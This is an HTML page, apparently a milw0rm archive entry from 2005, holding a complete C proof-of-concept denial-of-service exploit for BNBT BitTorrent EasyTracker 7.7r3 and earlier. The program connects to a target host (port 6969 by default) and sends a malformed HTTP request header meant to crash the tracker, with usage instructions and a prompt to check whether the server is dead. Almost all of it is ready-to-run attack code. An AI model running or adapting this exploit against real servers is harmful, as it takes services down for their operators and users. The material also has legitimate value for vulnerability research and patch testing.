<html>
<head>
<title>BNBT BitTorrent EasyTracker <= 7.7r3 Denial of Service Exploit</title>
</head>
<pre>
/* BNBT BitTorrent EasyTracker Remote Denial Of Service
   
   Versions:
   Version 7.7r3.2004.10.27 and below
  
   Vendors:
   http://bnbt.go-dedicated.com/
   http://bnbteasytracker.sourceforge.net/
   http://sourceforge.net/projects/bnbtusermods/

   Bug find and coded by:
   Sowhat@@secway@org
   http://secway.org

   This PoC will Crash the server.
 */

#include &lt;winsock2.h&gt;
#include &lt;stdio.h&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)

char exploit[] = 

&quot;GET /index.htm HTTP/1.0\r\n:\r\n\r\n&quot;;

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent  *pTarget;
	struct sockaddr_in 	sock;
	char *target;
	int port,bufsize;
	SOCKET mysocket;
	
	if (argc &lt; 2)
	{
		printf(&quot; ######################################################################\r\n&quot;);
		printf(&quot; #   BNBT BitTorrent EasyTracker DoS by sowhat &lt;sowhat@@secway@org&gt;   #\r\n&quot;, argv[0]);
		printf(&quot; #          This exploit will Crash the Server                        #\r\n&quot;);
		printf(&quot; #               http://www.secway.org                                #\r\n&quot;);		
		printf(&quot; ######################################################################\r\n&quot;);
		printf(&quot; Usage:\r\n %s &lt;targetip&gt; [targetport] (default is 6969)	\r\n&quot;, argv[0]);
		printf(&quot; Example:\r\n&quot;);
		printf(&quot;	%s 1.1.1.1\r\n&quot;,argv[0]);
		printf(&quot;	%s 1.1.1.1 8888\r\n&quot;,argv[0]);
		exit(1);
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) return -1;

	target = argv[1];
	port = 6969;

	if (argc &gt;= 3) port = atoi(argv[2]);
	bufsize = 1024;
	if (argc &gt;= 4) bufsize = atoi(argv[3]);

	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if(mysocket==INVALID_SOCKET)
	{	
		printf(&quot;Socket error!\r\n&quot;);
		exit(1);
	}

	printf(&quot;Resolving Hostnames...\n&quot;);
	if ((pTarget = gethostbyname(target)) == NULL)
	{
		printf(&quot;Resolve of %s failed\n&quot;, argv[1]);
		exit(1);
	}

	memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons((USHORT)port);

	printf(&quot;Connecting...\n&quot;);
	if ( (connect(mysocket, (struct sockaddr *)&amp;sock, sizeof (sock) )))
	{
		printf(&quot;Couldn't connect to host.\n&quot;);
		exit(1);
	}

	printf(&quot;Connected!...\n&quot;);
	printf(&quot;Sending Payload...\n&quot;);
	if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
	{
		printf(&quot;Error Sending the Exploit Payload\r\n&quot;);
		closesocket(mysocket);
		exit(1);
	}

	printf(&quot;Payload has been sent! Check if the webserver is dead.\r\n&quot;);
	closesocket(mysocket);
	WSACleanup();
	return 0;
}

// milw0rm.com [2005-09-06]
</pre>
</html>

